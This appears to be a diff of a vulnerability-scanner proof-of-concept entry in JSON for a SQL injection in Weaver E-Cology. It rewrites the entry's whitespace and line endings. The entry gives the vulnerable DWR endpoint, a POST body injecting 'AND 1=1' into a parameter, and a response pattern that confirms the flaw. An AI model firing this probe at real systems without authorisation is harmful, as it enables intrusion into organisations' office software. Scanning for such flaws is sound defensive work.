@@ -1,15 +1,1 @@
-{
-  "num": 2,
-  "name":"泛微E-Cology某版本SQL注入漏洞",
-  "tag":"fanwei",
-  "type":"sql",
-  "poc": {
-    "pocGet": "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr",
-    "pocPost": "callCount=1\npage=\nhttpSessionId=\nscriptSessionId=\nc0-scriptName=DocDwrUtil\nc0-methodName=ifNewsCheckOutByCurrentUser\nc0-id=0\nc0-param0=string:1 AND 1=1\nc0-param1=string:1\nbatchId=0",
-    "header": {
-      "content-type": "text/plain",
-      "User-Agent": "Mozilla/5.0 (Linux;"
-    },
-    "Pattern": "(remoteHandleCallback('0','0',true))"
-  }
-}
+{  "num": 2,  "name":"泛微E-Cology某版本SQL注入漏洞",  "tag":"fanwei",  "type":"sql",  "poc": {    "pocGet": "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr",    "pocPost": "callCount=1\r\npage=\r\nhttpSessionId=\r\nscriptSessionId=\r\nc0-scriptName=DocDwrUtil\r\nc0-methodName=ifNewsCheckOutByCurrentUser\r\nc0-id=0\r\nc0-param0=string:1 AND 1=1\r\nc0-param1=string:1\r\nbatchId=0",    "header": {      "content-type": "text/plain",      "User-Agent": "Mozilla/5.0 (Linux;"    },    "Pattern": "(remoteHandleCallback('0','0',true))"  }}
